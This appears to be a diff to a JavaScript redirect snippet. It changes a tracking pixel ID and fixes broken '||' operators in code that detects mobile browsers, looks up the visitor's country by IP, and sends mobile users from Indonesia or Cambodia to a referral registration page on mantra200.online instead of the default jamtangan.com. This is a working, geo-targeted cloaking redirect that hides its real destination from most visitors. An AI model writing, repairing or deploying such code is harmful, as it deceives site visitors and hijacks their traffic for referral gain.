@@ -28,13 +28,13 @@ s.parentNode.insertBefore(t,s);
  
 (function(){
  
-var PIXEL_ID='1547419423101743';
+var PIXEL_ID='1364220892549204';
  
 // 📱 MOBILE
 var isMobile=/Android|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i
 .test(navigator.userAgent);
  
-// 🖥 DEFAULT
+// 🖥️ DEFAULT
 var DESTINATION_URL='https://jamtangan.com';
  
 // ⏱️ DELAY
@@ -141,7 +141,7 @@ try{
 const res=await fetch('https://ipapi.co/json/');
 const data=await res.json();
  
-var country=(data.country_code  '').toUpperCase();
+var country=(data.country_code || '').toUpperCase();
  
 console.log('Detected Country:',country);
  
@@ -149,7 +149,7 @@ console.log('Detected Country:',country);
 if(isMobile){
  
 // 🇮🇩 🇰🇭
-if(country==='ID'  country==='KH'){
+if(country==='ID' || country==='KH'){
  
 DESTINATION_URL=
 'https://www.mantra200.online/register?referral=Sophie889';
